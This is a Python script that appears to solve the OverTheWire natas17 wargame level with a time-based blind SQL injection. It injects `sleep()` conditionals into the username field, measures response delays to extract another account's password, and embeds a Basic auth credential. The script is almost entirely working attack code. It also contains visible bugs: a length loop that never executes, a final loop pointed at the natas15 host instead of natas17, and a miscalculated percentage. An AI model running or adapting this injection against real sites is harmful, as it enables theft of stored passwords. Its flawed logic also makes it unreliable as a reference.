from requests import get
from urllib.parse import quote
from requests.auth import HTTPBasicAuth
from string import ascii_lowercase
from string import ascii_uppercase
from time import time
from time import sleep

#natas18"+if(password like '__...___', 0,sleep(5)); #

char_well = ascii_lowercase+ascii_uppercase+'0123456789'
semaphore=0
char_num=32
sleep_sec=1

head={'Host': 'natas17.natas.labs.overthewire.org'\
,'Accept-Encoding': 'gzip, deflate'\
,'DNT': '1'\
,'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}

payload = 'natas18"+if(password like \''

while(semaphore==0 and char_num==0):
    char_num=char_num+1
    print('Testing password of '+str(char_num)+' chars')
    payload= payload+'_'
    payload2= payload+'\', sleep('+str(sleep_sec)+'), 0); # ' 
    payload2 = quote(payload2,safe='')
    link='http://natas17.natas.labs.overthewire.org/?username='+payload2
    
    elapsed_time=time()
    req = get(link, headers=head)
    elapsed_time=time()-elapsed_time

    if(req.status_code==200):
        if(elapsed_time>=sleep_sec):
            print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
            sleep(1)
            elapsed_time=time()
            req = get(link, headers=head)
            elapsed_time=time()-elapsed_time
            if(elapsed_time>=sleep_sec):
                semaphore=1
            
    else:
        print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
        payload= payload[0:len(payload)-1]
        char_num=char_num-1
    sleep(.1)


print('Seems that the password is '+str(char_num)+' chars long')

print('Creating a list o chars for the password')
payload = 'natas18"+if(password like \'%'

strained_chars=''
filtered=''
if(strained_chars==''):
    for char in char_well:
        payload2= payload+char+'%\', sleep('+str(sleep_sec)+'), 0); # ' 
        print('Testing '+payload2)
        payload2 = quote(payload2,safe='')
        link='http://natas17.natas.labs.overthewire.org/?username='+payload2
    
        elapsed_time=time()
        req = get(link, headers=head)
        elapsed_time=time()-elapsed_time

        if(req.status_code==200):
            if(elapsed_time>=sleep_sec):
                print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
                sleep(1)
                elapsed_time=time()
                req = get(link, headers=head)
                elapsed_time=time()-elapsed_time
                if(elapsed_time>=sleep_sec):
                    strained_chars= strained_chars+char
                    print('Char Present!')
            else:
                filtered=filtered+char
        
            
        else:
            print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
            payload= payload[0:len(payload)-1]
            char_num=char_num-1
        sleep(.3)

print(filtered)


print('Seems that the password contain only this characters: \''+strained_chars+'\'\nThe dictionary has been shrunk by '+str(int((len(char_well)*100/len(strained_chars)))-100)+'%!')
print('Finally Bruteforcing Password...')

sleep(1)

password=''
i=0
while(i<char_num-len(password)):
    payload = 'natas18"+if(password like binary \''
    
    for char in strained_chars:
        print('Testing char '+char+' for position '+str(i))
        payload2=payload+password+char
        if(i!=char_num-len(password)-1):
            payload2= payload2+'%'

        payload2= payload2+'\', sleep('+str(sleep_sec)+'), 0); # ' 
        print('Testing '+payload2)
        payload2 = quote(payload2,safe='')
        link='http://natas15.natas.labs.overthewire.org/?username='+payload2
    
        elapsed_time=time()
        req = get(link, headers=head)
        elapsed_time=time()-elapsed_time

        if(req.status_code==200):
            if(elapsed_time>=sleep_sec):
                print('Request produced http_code 200 in '+str(elapsed_time)+' secs > '+str(sleep_sec)+'\nRetesting in 1 sec...')
                sleep(.5)
                elapsed_time=time()
                req = get(link, headers=head)
                elapsed_time=time()-elapsed_time
                if(elapsed_time>=sleep_sec):
                    password=password+char
                    print('Char Present!')
                    break;
            
            elif(char=='9'):
                i=i-1
                break
            
        else:
            print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
            password= password[0:len(password)-1]
            i=i-1
            break

        sleep(.3)
    i=i+1

   

print('We have the password! Here it is: '+password)

